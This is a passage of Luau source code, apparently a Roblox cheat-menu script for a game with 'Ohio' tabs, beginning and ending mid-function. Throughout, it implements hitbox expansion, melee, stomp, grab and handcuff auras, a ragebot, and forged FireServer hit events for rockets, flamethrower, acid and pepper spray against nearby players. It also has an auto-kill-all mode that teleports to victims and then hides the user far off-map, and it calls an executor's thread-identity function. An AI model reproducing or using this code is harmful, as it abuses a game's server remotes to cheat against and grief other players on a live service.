											if tbl30.GunMod.Enabled then
												fn132()
											end
										end,
									})

									gunMod:CreateSlider({
										Id = "ohio-gun-mod-fire-debounce",
										Name = "Fire Debounce",
										Min = 0,
										Max = 100,
										Default = tbl30.GunMod.FireDebounce,
										Step = 1,
										Callback = function(fireDebounce)
											tbl30.GunMod.FireDebounce = fireDebounce

											if tbl30.GunMod.Enabled then
												fn132()
											end
										end,
									})

									gunMod:CreateSlider({
										Id = "ohio-gun-mod-bullet-speed",
										Name = "Bullet Speed",
										Min = 0.1,
										Max = 100,
										Default = tbl30.GunMod.BulletSpeed,
										Step = 0.1,
										Callback = function(bulletSpeed)
											tbl30.GunMod.BulletSpeed = bulletSpeed

											if tbl30.GunMod.Enabled then
												fn132()
											end
										end,
									})

									gunMod:CreateSlider({
										Id = "ohio-gun-mod-bullet-lifetime",
										Name = "Bullet Lifetime",
										Min = 0.1,
										Max = 10,
										Default = tbl30.GunMod.BulletLifetime,
										Step = 0.1,
										Callback = function(bulletLifetime)
											tbl30.GunMod.BulletLifetime = bulletLifetime

											if tbl30.GunMod.Enabled then
												fn132()
											end
										end,
									})

									local v30 = nil

									legit:CreateModule({
										Id = "ohio-legit-inf-coffee",
										Name = "Inf Coffee",
										Default = true,
										Callback = function(arg)
											v30 = arg

											if arg then
												SetAttribute(LocalPlayer, "speedModifier", 6)
											end
										end,
									})

									LocalPlayer:GetAttributeChangedSignal("speedModifier", function()
										if not v30 then
											return
										end
										local speedModifier = GetAttribute(LocalPlayer, "speedModifier")

										if speedModifier and speedModifier < 6 then
											SetAttribute(LocalPlayer, "speedModifier", 6)
										end
									end)
								end

								fn110()
								local ohioRage = window:CreateTab({ Id = "ohio-rage", Name = "Ohio Rage" })

								local function fn111()
									local tbl30 = {
										Hitbox = {
											Enabled = false,
											Size = 15,
											Color = NewColor3(1, 1, 1),
											Transparency = 0.95,
											Part = "Body",
											HitChance = 100,
										},
										MeleeAura = { Enabled = false, Vehicles = false },
										BreakVest = false,
										StompAuraModule = nil,
										GrabAuraModule = nil,
										GrabAuraDrop = false,
										HandcuffAuraModule = nil,
										AutoVest = { Module = nil, Vest = "Light Vest" },
										AutoHealModule = nil,
										Ragebot = { Module = nil, Nextbot = false },
										RPG_TridentAll = { Enabled = false, Delay = 1 },
										Flame_AcidKillNearest = false,
										SprayNearest = false,
									}

									OhioRageState = tbl30
									local tbl31 = {}
									local vector = NewVector3(0, 0, 0)

									local function fn112(arg, arg2)
										local hitbox = tbl30.Hitbox

										if tbl31[arg2] == nil then
											tbl31[arg2] = arg.Color
										end

										local size = hitbox.Size

										if vector.X ~= size or vector.Y ~= size or vector.Z ~= size then
											vector = NewVector3(size, size, size)
										end

										if arg.Size ~= vector then
											arg.Size = vector
										end

										if arg.Color ~= hitbox.Color then
											arg.Color = hitbox.Color
										end

										if arg.Transparency ~= hitbox.Transparency then
											arg.Transparency = hitbox.Transparency
										end

										if arg.CanCollide then
											arg.CanCollide = false
										end
									end

									local function fn113(arg)
										if arg == LocalPlayer then
											return
										end
										local character = arg.Character
										if not character or not character.Parent then
											return
										end

										if GetAttribute(arg, "isSpawned") ~= true then
											return
										end
										local humanoidRootPart = FindFirstChild(character, "HumanoidRootPart")
										local humanoid = FindFirstChildOfClass(character, "Humanoid")
										if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
											return
										end

										if FindFirstChildOfClass(character, "ForceField") then
											return
										end

										if not CheckState(arg) then
											return
										end
										fn112(humanoidRootPart, character)
									end

									local function fn114()
										if not (tbl30.Hitbox.Module and tbl30.Hitbox.Module:Get()) then
											return
										end
										local players = GetPlayerList()

										for i = 1, #players do
											pcall(fn113, players[i])
										end
									end

									local function fn115()
										local players = GetPlayerList()

										for i = 1, #players do
											local v18 = players[i]

											if v18 ~= LocalPlayer then
												local character = v18.Character

												local humanoidRootPart = character
													and FindFirstChild(character, "HumanoidRootPart")

												if humanoidRootPart then
													if tbl31[character] then
														humanoidRootPart.Color = tbl31[character]
														tbl31[character] = nil
													end

													humanoidRootPart.Size = NewVector3(2, 2, 1)
													humanoidRootPart.Transparency = 1
													humanoidRootPart.CanCollide = true
												end
											end
										end
									end

									local thread = nil

									local function fn116()
										pcall(task.cancel, thread)
										thread = nil
									end

									local function fn117()
										fn116()
										if not tbl30.Hitbox.Module then
											return
										end

										thread = Spawn(function()
											while tbl30.Hitbox.Module and tbl30.Hitbox.Module:Get() do
												Wait(0.5)

												for k in pairs(tbl31) do
													if not k or not k.Parent then
														tbl31[k] = nil
													end
												end

												fn114()
											end
										end)
									end

									Connect(Players.PlayerAdded, function(arg)
										if arg == LocalPlayer then
											return
										end

										Connect(arg.CharacterAdded, function()
											if tbl30.Hitbox.Module and tbl30.Hitbox.Module:Get() then
												fn113(arg)
											end
										end)
									end)

									local function fn118()
										return tbl30.MeleeAura.Module and tbl30.MeleeAura.Module:Get()
											or tbl30.StompAuraModule and tbl30.StompAuraModule:Get()
											or tbl30.GrabAuraModule and tbl30.GrabAuraModule:Get()
											or tbl30.HandcuffAuraModule and tbl30.HandcuffAuraModule:Get()
											or tbl30.Ragebot.Module and tbl30.Ragebot.Module:Get()
											or tbl30.RPG_TridentAll.Module and tbl30.RPG_TridentAll.Module:Get()
											or tbl30.Flame_AcidKillNearest and tbl30.Flame_AcidKillNearest:Get()
											or tbl30.SprayNearest and tbl30.SprayNearest:Get()
									end

									local function fn119()
										return fn118() or tbl30.MeleeAura.Vehicles or tbl30.Ragebot.Nextbot
									end

									local tbl32 = { guid = nil, itemGuid = nil, nextShootAt = 0 }
									local n7 = 0

									local tbl33 = {
										RPG = {
											event = "rocketHit",
											vfx = function(arg)
												fn105("baserocketexplosion", arg)
											end,
										},
										Trident = {
											event = "rocketHit",
											vfx = function(arg)
												fn105("baserocketexplosion", arg)
											end,
										},
										Flamethrower = {
											event = "flameHit",
											vfx = function(arg)
												fn105("carfire", arg)
											end,
										},
										["Acid Gun"] = {
											event = "acidHit",
											vfx = function(arg)
												fn105("acidCloud", arg)
											end,
										},
										["Pepper Spray"] = {
											event = "pepperSprayHit",
											vfx = function(arg)
												fn105("pepperspray", arg)
											end,
										},
										["Fire Extinguisher"] = {
											event = "pepperSprayHit",
											vfx = function(arg)
												fn105("pepperspray", arg)
											end,
										},
									}

									local function fn120(arg, arg2)
										local head = arg2 or arg.head

										return {
											hitSize = head.Size,
											hitPart = head,
											hitPlayerId = arg.plr.UserId,
											pos = head.Position,
										}
									end

									local function fn121(arg, arg2, firemode)
										local v18 = fn108(arg, arg2)
										if #v18 == 0 then
											return nil
										end
										local firemode2 = arg.firemode

										if firemode then
											arg.firemode = firemode
										end

										local v19 = fn107(arg, v18)

										if firemode then
											arg.firemode = firemode2
										end

										if not v19 then
											return nil
										end
										return v18[1][1]
									end

									local function fn122(arg)
										local pos = arg and arg.pos
										local velocity = arg and arg.velocity
										if typeof(pos) ~= "Vector3" then
											return nil
										end

										if typeof(velocity) ~= "Vector3" or velocity.Magnitude <= 0.1 then
											return pos
										end
										return pos + velocity * Clamp((tonumber(arg.dist) or 0) / 800, 0.08, 0.35)
									end

									local function fn123(arg, arg2)
										local tbl34 = {}
										local tbl35 = {}

										for i = 1, #arg do
											if not tbl35[i] then
												local v18 = arg[i]
												local pos = v18.pos
												tbl35[i] = true
												local n8 = 1

												for i2 = i + 1, #arg do
													local v19 = arg[i2]

													if not tbl35[i2] and (v19.pos - v18.pos).Magnitude <= arg2 then
														tbl35[i2] = true
														pos += v19.pos
														n8 += 1
													end
												end

												Insert(tbl34, { pos = n8 == 1 and fn122(v18) or pos / n8 })
											end
										end

										return tbl34
									end

									local function fn124(arg, arg2)
										local now = tick()
										if now < n7 or not arg2[1] then
											return
										end
										n7 = now + (tonumber(tbl30.RPG_TridentAll.Delay) or 0.2)
										local guid = tbl32.guid

										if not guid or tbl32.itemGuid ~= arg.guid or now >= tbl32.nextShootAt then
											guid = fn121(arg, arg2[1].head)
											if not guid then
												return
											end
											tbl32.guid = guid
											tbl32.itemGuid = arg.guid
											tbl32.nextShootAt = now + 20
										end

										local v18 = tbl33[arg.name]
										local position = fn70()
										position = position and position.Position
										local v19 = fn123(arg2, 10)

										for i = 1, #v19 do
											local v20 = v19[i]

											if v20.pos and (not position or (v20.pos - position).Magnitude > 15) then
												FireServer(v18.event, guid, guid, v20.pos)
												v18.vfx(v20.pos)
											end
										end

										FireServer("projectileHit", guid, "player", fn120(arg2[1], arg2[1].head))
										fn106(arg)
									end

									local function fn125(arg, arg2)
										if not arg2 then
											return
										end
										local head = arg2.head
										local v18 = fn121(arg, head, arg.name == "Acid Gun" and "semi" or "auto")
										if not v18 then
											return
										end
										local v19 = tbl33[arg.name]

										for i = 1, 3 do
											local position = head.Position
											FireServer(v19.event, v18, GUID(), position)
										end

										FireServer("projectileHit", v18, "player", fn120(arg2, head))
										v19.vfx(head.Position)
										fn106(arg)
									end

									local function fn126(arg, arg2)
										if not arg2 then
											return
										end
										local head = arg2.head
										local v18 = fn121(arg, head, "auto")
										if not v18 then
											return
										end
										FireServer("pepperSprayHit", v18, "player", fn120(arg2, head))
										tbl33[arg.name].vfx(head.Position)
										fn106(arg)
									end

									local tbl34 = {}

									local function fn127()
										local tbl35 = {}
										local v18 = nil
										local v19 = nil
										local v20

										for i = 1, fn100() do
											if
												v16[7][v16[6] + i]
												and v12[7][v12[6] + i]
												and v12[7][v12[6] + i].Health > 0
											then
												local v21 = v17[7][v17[6] + i]
												local v22 = v11[7][v11[6] + i]
												local v23 = v12[7][v12[6] + i]
												local v24 = v13[7][v13[6] + i]
												v18 = v18 or v21
												v19 = v19 or v22
												v20 = v20 or v23

												Insert(tbl35, {
													plr = v21,
													pos = v24.Position,
													hrp = v24,
													velocity = v24.AssemblyLinearVelocity or v24.Velocity,
													head = v14[7][v14[6] + i],
													dist = v15[7][v15[6] + i],
												})
											end
										end

										return tbl35, v18, v19, v20
									end

									local function fn128(arg, arg2)
										if not arg() then
											return
										end

										Insert(
											tbl34,
											Spawn(function()
												while arg() do
													arg2()
													Wait()
												end
											end)
										)
									end

									local function fn129()
										for i = 1, #tbl34 do
											local v18 = tbl34[i]

											if v18 then
												Cancel(v18)
											end
										end

										table.clear(tbl34)
										if not fn119() then
											return
										end

										fn128(function()
											return tbl30.MeleeAura.Module and tbl30.MeleeAura.Module:Get()
										end, function()
											if not fn70() then
												return
											end

											for i = 1, fn100() do
												if v16[7][v16[6] + i] then
													local v18 = v17[7][v17[6] + i]

													if v15[7][v15[6] + i] <= 14 and v12[7][v12[6] + i].Health > 5 then
														local Fists = fn71("Fists")

														if Fists then
															local guid = Fists.guid
															local brassKnuckles = fn71("Brass Knuckles")
															local str3 = "meleemegapunch"

															if tbl30.BreakVest then
																if not brassKnuckles and not fn86(LocalPlayer) then
																	fn92("Brass Knuckles")
																end

																if brassKnuckles then
																	guid = brassKnuckles.guid
																	str3 = "meleepunch"
																end
															end

															if fn86(v18) then
																str3 = "meleepunch"
															end

															fn95(guid, str3, v18)
														end
													end
												end
											end
										end)

										fn128(function()
											return tbl30.StompAuraModule and tbl30.StompAuraModule:Get()
										end, function()
											if not fn70() then
												return
											end

											for i = 1, fn100() do
												if v16[7][v16[6] + i] then
													local v18 = v17[7][v17[6] + i]
													local v19 = v15[7][v15[6] + i]

													if v19 <= 30 and fn86(v18) then
														if v19 <= 14 then
															fn96(v18)
														else
															fn97(v18)
															fn96(v18)
														end
													end
												end
											end
										end)

										fn128(function()
											return tbl30.GrabAuraModule and tbl30.GrabAuraModule:Get()
										end, function()
											if not fn70() then
												return
											end

											for i = 1, fn100() do
												if v16[7][v16[6] + i] then
													local v18 = v17[7][v17[6] + i]

													if v15[7][v15[6] + i] <= 30 and fn86(v18) then
														fn97(v18)

														if tbl30.GrabAuraDrop then
															fn98(v18)
														end
													end
												end
											end
										end)

										fn128(function()
											return tbl30.HandcuffAuraModule and tbl30.HandcuffAuraModule:Get()
										end, function()
											if not fn70() then
												return
											end

											for i = 1, fn100() do
												if v16[7][v16[6] + i] then
													local v18 = v17[7][v17[6] + i]

													if
														v15[7][v15[6] + i] <= 30
														and fn86(v18)
														and not ClientReplicator.Get(v18, "cuffed")
													then
														fn99(v18)
													end
												end
											end
										end)

										fn128(function()
											return tbl30.MeleeAura.Vehicles
										end, function()
											if not fn70() then
												return
											end
											local Fists = fn71("Fists")
											local v18 = Fists and fn101()[1]

											if v18 and v18.dist <= 15 then
												fn95(Fists.guid, "meleemegapunch", v18.model)
											end
										end)

										fn128(function()
											return tbl30.Ragebot.Module and tbl30.Ragebot.Module:Get()
										end, function()
											if not fn70() then
												return
											end
											local v18, v19, v20, v21 = fn127()
											local v22 = fn73(LocalPlayer)

											if
												v19
												and v20
												and v22
												and v22.type == "Gun"
												and v21
												and v21.Health > 0
												and not tbl33[v22.name]
											then
												fn109(v22, v19, v20.Head)
											end
										end)

										fn128(function()
											return tbl30.RPG_TridentAll.Module and tbl30.RPG_TridentAll.Module:Get()
										end, function()
											if not fn70() then
												return
											end
											local v18, v19, v20, v21 = fn127()
											local v22 = fn73(LocalPlayer)

											if
												v19
												and v20
												and v22
												and v22.type == "Gun"
												and v21
												and v21.Health > 0
												and (v22.name == "RPG" or v22.name == "Trident")
											then
												fn124(v22, v18)
											end
										end)

										fn128(function()
											return tbl30.Flame_AcidKillNearest and tbl30.Flame_AcidKillNearest:Get()
										end, function()
											if not fn70() then
												return
											end
											local v18, v19, v20, v21 = fn127()
											local v22 = fn73(LocalPlayer)

											if
												v19
												and v20
												and v22
												and v22.type == "Gun"
												and v21
												and v21.Health > 0
												and (v22.name == "Flamethrower" or v22.name == "Acid Gun")
											then
												fn125(v22, v18[1])
											end
										end)

										fn128(function()
											return tbl30.SprayNearest and tbl30.SprayNearest:Get()
										end, function()
											if not fn70() then
												return
											end
											local v18, v19, v20, v21 = fn127()
											local v22 = fn73(LocalPlayer)

											if
												v19
												and v20
												and v22
												and v22.type == "Gun"
												and v21
												and v21.Health > 0
												and (v22.name == "Pepper Spray" or v22.name == "Fire Extinguisher")
											then
												fn126(v22, v18[1])
											end
										end)

										fn128(function()
											return tbl30.Ragebot.Nextbot
										end, function()
											if not fn70() then
												return
											end
											local v18 = fn73(LocalPlayer)

											local nextBots = FindFirstChild(workspace, "NextBots")
												and GetChildren(workspace.NextBots)[1]

											if v18 and nextBots and v18.type == "Gun" and v18.name ~= "RPG" then
												local primaryPart = FindFirstChild(nextBots, "Hitbox")
													or nextBots.PrimaryPart

												if primaryPart then
													local v19 = fn108(v18, primaryPart)

													if #v19 > 0 then
														fn107(v18, v19)
													end
												end
											end
										end)
									end

									local tbl35 = {}

									local function fn130()
										for i = 1, #tbl35 do
											local v18 = tbl35[i]

											if v18 then
												Cancel(v18)
											end
										end

										table.clear(tbl35)

										if tbl30.AutoVest.Module:Get() then
											Insert(
												tbl35,
												Spawn(function()
													while tbl30.AutoVest.Module:Get() do
														if not fn68() or not fn69() or fn86(LocalPlayer) then
															Wait()
														else
															if
																not GetAttribute(LocalPlayer, "armor")
																or GetAttribute(LocalPlayer, "armor")
																	and GetAttribute(LocalPlayer, "armor") < 30
															then
																for i = 1, #tbl9 do
																	local v18 = tbl9[i]

																	for i2 = 1, 2 do
																		local v19 = fn71(v18)

																		if v19 then
																			fn75(v19.guid)
																			FireServer("useConsumable", v19.guid)
																			fn76(v19.guid)
																			fn92(tbl30.AutoVest.Vest)
																			break
																		else
																			fn92(tbl30.AutoVest.Vest)
																		end
																	end
																end
															end

															Wait()
														end
													end
												end)
											)
										end

										if tbl30.AutoHealModule:Get() then
											Insert(
												tbl35,
												Spawn(function()
													while tbl30.AutoHealModule:Get() do
														if not fn68() or not fn69() or fn86(LocalPlayer) then
															Wait()
														else
															local v18 = fn69()

															if v18 and v18.Health < v18.MaxHealth then
																local tbl36 = { "Bandage", "Beans" }

																for i = 1, #tbl36 do
																	local v19 = tbl36[i]

																	for i2 = 1, 2 do
																		local v20 = fn71(v19)

																		if v20 then
																			fn92(v19, true)
																			fn75(v20.guid)
																			FireServer("useConsumable", v20.guid)

																			if
																				v20.ammoManager
																				and v20.ammoManager.ammo < 1
																			then
																				fn76(v20.guid)
																				fn92(v19)
																			end

																			break
																		else
																			fn92(v19)
																		end
																	end
																end
															end

															Wait()
														end
													end
												end)
											)
										end
									end

									tbl30.Hitbox.Module = ohioRage:CreateModule({
										Id = "ohio-hitbox",
										Name = "Hitbox",
										Callback = function(arg)
											fn129()

											if arg then
												fn117()
												fn114()
											else
												fn116()
												fn115()
											end
										end,
									})

									tbl30.Hitbox.Module:CreateKeybind({
										Id = "ohio-hitbox-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.Hitbox.Module:Set(not tbl30.Hitbox.Module:Get())
										end,
									})

									tbl30.Hitbox.Module:CreateSelector({
										Id = "ohio-hitbox-part",
										Name = "Part",
										Options = { { Value = "Head" }, { Value = "Body" }, { Value = "Random" } },
										Default = tbl30.Hitbox.Part,
										Callback = function(part)
											tbl30.Hitbox.Part = part
										end,
									})

									tbl30.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-hit-chance",
										Name = "Hit Chance",
										Min = 0,
										Max = 100,
										Default = tbl30.Hitbox.HitChance,
										Step = 1,
										Callback = function(hitChance)
											tbl30.Hitbox.HitChance = hitChance
										end,
									})

									tbl30.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-size",
										Name = "Size",
										Min = 1,
										Max = 100,
										Default = 3,
										Step = 0.1,
										Callback = function(size)
											tbl30.Hitbox.Size = size
											fn114()
										end,
									})

									tbl30.Hitbox.Module:CreateSlider({
										Id = "ohio-hitbox-transparency",
										Name = "Transparency",
										Min = 0,
										Max = 1,
										Default = tbl30.Hitbox.Transparency,
										Step = 0.1,
										Callback = function(transparency)
											tbl30.Hitbox.Transparency = transparency
											fn114()
										end,
									})

									tbl30.Hitbox.Module:CreateColorPicker({
										Id = "ohio-hitbox-color",
										Name = "Color",
										Default = tbl30.Hitbox.Color,
										Callback = function(color)
											tbl30.Hitbox.Color = color
											fn114()
										end,
									})

									tbl30.MeleeAura.Module = ohioRage:CreateModule({
										Id = "ohio-melee-aura",
										Name = "Melee Aura",
										Callback = function()
											fn129()
										end,
									})

									tbl30.MeleeAura.Module:CreateToggle({
										Id = "ohio-melee-aura-vehicles",
										Name = "Vehicles",
										Default = tbl30.MeleeAura.Vehicles,
										Callback = function(vehicles)
											tbl30.MeleeAura.Vehicles = vehicles
											fn129()
										end,
									})

									tbl30.MeleeAura.Module:CreateToggle({
										Id = "ohio-melee-aura-break-vest",
										Name = "Break Vest",
										Default = tbl30.BreakVest,
										Callback = function(breakVest)
											tbl30.BreakVest = breakVest
										end,
									})

									tbl30.StompAuraModule = ohioRage:CreateModule({
										Id = "ohio-stomp-aura",
										Name = "Stomp Aura",
										Callback = function()
											fn129()
										end,
									})

									tbl30.StompAuraModule:CreateKeybind({
										Id = "ohio-stomp-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.StompAuraModule:Set(not tbl30.StompAuraModule:Get())
										end,
									})

									tbl30.GrabAuraModule = ohioRage:CreateModule({
										Id = "ohio-grab-aura",
										Name = "Grab Aura",
										Callback = function()
											fn129()
										end,
									})

									tbl30.GrabAuraModule:CreateKeybind({
										Id = "ohio-grab-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.GrabAuraModule:Set(not tbl30.GrabAuraModule:Get())
										end,
									})

									tbl30.GrabAuraModule:CreateToggle({
										Id = "ohio-grab-aura-drop",
										Name = "Drop",
										Default = tbl30.GrabAuraDrop,
										Callback = function(grabAuraDrop)
											tbl30.GrabAuraDrop = grabAuraDrop
										end,
									})

									tbl30.HandcuffAuraModule = ohioRage:CreateModule({
										Id = "ohio-handcuff-aura",
										Name = "Handcuff Aura",
										Callback = function()
											fn129()
										end,
									})

									tbl30.HandcuffAuraModule:CreateKeybind({
										Id = "ohio-handcuff-aura-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.HandcuffAuraModule:Set(not tbl30.HandcuffAuraModule:Get())
										end,
									})

									local v18 = nil
									local thread2 = nil
									local n8 = 3

									local shakeAura = ohioRage:CreateModule({
										Id = "ohio-shake-aura",
										Name = "Shake Aura",
										Callback = function(arg)
											v18 = arg
											pcall(task.cancel, thread2)

											thread2 = Spawn(function()
												while v18 and Wait() do
													for i = 1, fn100() do
														if not v16[7][v16[6] + i] then
															continue
														else
															local v19 = v17[7][v17[6] + i]

															if not (v12[7][v12[6] + i].Health > 0) then
																continue
															else
																fn98(v19)
																if not (n8 <= i) then
																	continue
																end
															end
														end

														break
													end
												end
											end)
										end,
									})

									shakeAura:CreateKeybind({
										Id = "ohio-shake-aura-keybind",
										Name = "Keybind",
										Callback = function()
											shakeAura:Set(not shakeAura:Get())
										end,
									})

									shakeAura:CreateSlider({
										Id = "ohio-shake-aura-max-target",
										Name = "Max Target",
										Min = 1,
										Max = 10,
										Default = n8,
										Step = 1,
										Callback = function(arg)
											n8 = arg
										end,
									})

									tbl30.AutoVest.Module = ohioRage:CreateModule({
										Id = "ohio-auto-vest",
										Name = "Auto Vest",
										Callback = function(arg)
											fn130()

											if arg then
												fn92(tbl30.AutoVest.Vest)
											end
										end,
									})

									tbl30.AutoVest.Module:CreateKeybind({
										Id = "ohio-auto-vest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.AutoVest.Module:Set(not tbl30.AutoVest.Module:Get())
										end,
									})

									tbl30.AutoVest.Module:CreateSelector({
										Id = "ohio-auto-vest-vest",
										Name = "Vest",
										Options = {
											{ Value = "Light Vest" },
											{ Value = "Medium Vest" },
											{ Value = "Heavy Vest" },
										},
										Default = tbl30.AutoVest.Vest,
										Callback = function(vest)
											tbl30.AutoVest.Vest = vest
										end,
									})

									tbl30.AutoHealModule = ohioRage:CreateModule({
										Id = "ohio-auto-heal",
										Name = "Auto Heal",
										Callback = function(arg)
											fn130()

											if arg then
												fn92("Bandage")
												fn92("Beans")
											end
										end,
									})

									tbl30.AutoHealModule:CreateKeybind({
										Id = "ohio-auto-heal-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.AutoHealModule:Set(not tbl30.AutoHealModule:Get())
										end,
									})

									tbl30.Ragebot.Module = ohioRage:CreateModule({
										Id = "ohio-ragebot",
										Name = "Ragebot",
										Callback = function()
											fn129()
										end,
									})

									tbl30.Ragebot.Module:CreateKeybind({
										Id = "ohio-ragebot-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.Ragebot.Module:Set(not tbl30.Ragebot.Module:Get())
										end,
									})

									tbl30.Ragebot.Module:CreateToggle({
										Id = "ohio-ragebot-nextbot",
										Name = "Nextbot",
										Default = tbl30.Ragebot.Nextbot,
										Callback = function(nextbot)
											tbl30.Ragebot.Nextbot = nextbot
											fn129()
										end,
									})

									tbl30.RPG_TridentAll.Module = ohioRage:CreateModule({
										Id = "ohio-rpg-trident-all",
										Name = "RPG/Trident All",
										Callback = function()
											fn129()
										end,
									})

									tbl30.RPG_TridentAll.Module:CreateKeybind({
										Id = "ohio-rpg-trident-all-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.RPG_TridentAll.Module:Set(not tbl30.RPG_TridentAll.Module:Get())
										end,
									})

									tbl30.RPG_TridentAll.Module:CreateSlider({
										Id = "ohio-rpg-trident-all-delay",
										Name = "Delay",
										Min = 0.2,
										Max = 1,
										Default = tbl30.RPG_TridentAll.Delay,
										Step = 0.1,
										Callback = function(delay)
											tbl30.RPG_TridentAll.Delay = delay
										end,
									})

									tbl30.Flame_AcidKillNearest = ohioRage:CreateModule({
										Id = "ohio-flame-acid-nearest",
										Name = "Flame/Acid Nearest",
										Callback = function()
											fn129()
										end,
									})

									tbl30.Flame_AcidKillNearest:CreateKeybind({
										Id = "ohio-flame-acid-kill-nearest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.Flame_AcidKillNearest:Set(not tbl30.Flame_AcidKillNearest:Get())
										end,
									})

									tbl30.SprayNearest = ohioRage:CreateModule({
										Id = "ohio-spray-nearest",
										Name = "Spray Nearest",
										Callback = function()
											fn129()
										end,
									})

									tbl30.SprayNearest:CreateKeybind({
										Id = "ohio-spray-nearest-keybind",
										Name = "Keybind",
										Callback = function()
											tbl30.SprayNearest.Module:Set(not tbl30.SprayNearest.Module:Get())
										end,
									})
								end

								fn111()
								local target = window:CreateTab({ Id = "ohio-target", Name = "Target" })

								local function fn112()
									local n7 = 8

									TargetState = {
										AutoCounterAtk = false,
										AutoCounterOnAttack = false,
										AutoKlAll = false,
										AutoKlBlacklist = false,
										Method = "Melee",
										IFF = true,
										HideInterval = 0.1,
									}

									local function fn113()
										return not PlayerList.HasBlacklist or PlayerList:HasBlacklist()
									end

									local function fn114()
										return TargetState.AutoKlAll or TargetState.AutoKlBlacklist and fn113()
									end

									local function fn115(arg)
										if typeof(arg) == "table" then
											arg = arg.Value or arg.Title or arg.Name
										end

										if arg == "Gun" then
											return "Gun"
										end
										return "Melee"
									end

									local function fn116(arg, arg2, arg3, arg4, arg5)
										if
											not arg
											or arg == LocalPlayer
											or not arg2
											or not arg3
											or not arg4
											or not arg5
										then
											return false
										end

										if arg3.Health <= 0 or GetAttribute(arg, "isSpawned") == false then
											return false
										end

										if TargetState.IFF and FindFirstChildOfClass(arg2, "ForceField") then
											return false
										end

										if TargetState.AutoKlAll then
											return true
										end
										return TargetState.AutoKlBlacklist and fn113() and CheckState(arg) == true
									end

									local v18 = nil

									local function fn117()
										if not TargetState.AutoKlBlacklist then
											return false
										end
										return fn115(TargetState.Method) == "Gun"
									end

									local function fn118()
										local v19 = fn70()
										if not v19 then
											return
										end

										if not ohioTargetReturnCFrame then
											ohioTargetReturnCFrame = v19.CFrame
										end

										if not v18 then
											local function fn119()
												return (Random() * 2 - 1) * 99999
											end

											local newCFrame = NewCFrame
											local v20 = fn119()
											local n8 = Random() * 99999
											local v21 = fn119()
											v18 = newCFrame(v20, n8, v21)
										end

										v19.CFrame = v18
										v19.AssemblyLinearVelocity = EmptyVector3
										v19.AssemblyAngularVelocity = EmptyVector3
									end

									local function fn119()
										v18 = nil
										if not ohioTargetReturnCFrame then
											return
										end
										local v19 = fn70()
										if not v19 then
											return
										end
										v19.CFrame = ohioTargetReturnCFrame
										v19.AssemblyLinearVelocity = EmptyVector3
										v19.AssemblyAngularVelocity = EmptyVector3
										ohioTargetReturnCFrame = nil
									end

									local function fn120()
										local players = GetPlayerList()

										for i = 1, #players do
											local v19 = players[i]

											if v19 ~= LocalPlayer and GetAttribute(v19, "isSpawned") ~= false then
												if TargetState.AutoKlAll then
													return true
												end

												if
													TargetState.AutoKlBlacklist
													and fn113()
													and CheckState(v19) == true
												then
													return true
												end
											end
										end

										return false
									end

									local function fn121(arg, arg2, arg3, arg4)
										local v19 = fn115(TargetState.Method)

										if v19 == "Melee" then
											local Fists = fn71("Fists")
											if not Fists then
												return
											end
											local v20 = fn70()

											if v20 and arg3 then
												v20.CFrame = arg3.CFrame * NewCFrame(0, -3, 0)
												v20.AssemblyLinearVelocity = EmptyVector3
												v20.AssemblyAngularVelocity = EmptyVector3
											end

											if fn95(Fists.guid, "meleemegapunch", arg) then
												fn96(arg)
											end
										elseif v19 == "Gun" then
											local Raygun = fn73(LocalPlayer) or fn71("Raygun")

											if Raygun and Raygun.type == "Gun" then
												for i = 1, 3 do
													Spawn(fn109, Raygun, arg, arg4)
												end

												fn106(Raygun)
											elseif not fn86(LocalPlayer) then
												Spawn(fn92, "Raygun")
											end
										end
									end

									local function fn122()
										pcall(task.cancel, ohioTargetTask)
										ohioTargetTask = nil
										if not fn114() then
											fn119()
											return
										end

										ohioTargetTask = Spawn(function()
											local H = {}

											while D[1]() do
												local m

												local h, B = pcall(function()
													local t = GetPlayerList()

													for x = 1, #t, 1 do
														local R = t[x]
														x = R.Character
														local t = x and (FindFirstChildOfClass(x, "Humanoid"))
														local O = x and (FindFirstChild(x, "HumanoidRootPart"))
														local k = x and (FindFirstChild(x, "Head"))
														if D[2](R, x, t, O, k) then
															m = { plr = R, hum = t, hrp = O, head = k }
															break
														end
													end
												end)

												if not h then
													warn("[OhioTarget] " .. tostring(B))
												end

												B, h = pcall(function()
													if not D[3]() then
														D[4]()
													elseif not D[5]() then
														if luraph_box(D[6]) then
															D[4]()
														end
													elseif m then
														D[7]()
													elseif luraph_box(D[6]) then
														local t = D[8]()

														if t and ohioTargetReturnCFrame then
															t.CFrame = ohioTargetReturnCFrame
															t.AssemblyLinearVelocity = EmptyVector3
															t.AssemblyAngularVelocity = EmptyVector3
														end

														local __boxv0 = nil
														luraph_box_set(D[6], __boxv0)
													end
												end)

												if not B then
													warn("[OhioTargetHide] " .. tostring(h))
												end

												if m then
													B = tick()

													if not H[m.plr.UserId] or B - H[m.plr.UserId] >= 0.08 then
														H[m.plr.UserId] = B
														Spawn(D[9], m.plr, m.hum, m.hrp, m.head)
													end
												end

												Wait(D[5]() and TargetState.HideInterval or 0.05)
											end

											D[4]()
											ohioTargetTask = nil
										end)
									end

									ohioStartTargetWorker = fn122

									local function fn123(arg)
										if not TargetState.AutoCounterAtk or not arg or arg == LocalPlayer then
											return
										end
										local v19 = getthreadidentity and getthreadidentity() or nil
										pcall(setthreadidentity, oldTI or 8)
										pcall(PlayerList.SetState, PlayerList, arg, "Blacklist")
										pcall(fn7, "Auto Counter", arg.Name, 3)
										fn122()

										if v19 ~= nil then
											pcall(setthreadidentity, v19)
										end
									end

									local v19 = nil
									local connection = nil

									local function fn124(arg)
										if typeof(arg) ~= "Instance" then
											return nil
										end

										if IsA(arg, "Player") then
											return arg
										end

										while arg do
											if IsA(arg, "Model") then
												local playerFromCharacter = Players:GetPlayerFromCharacter(arg)
												if playerFromCharacter then
													return playerFromCharacter
												end
											end

											arg = arg.Parent
										end

										return nil
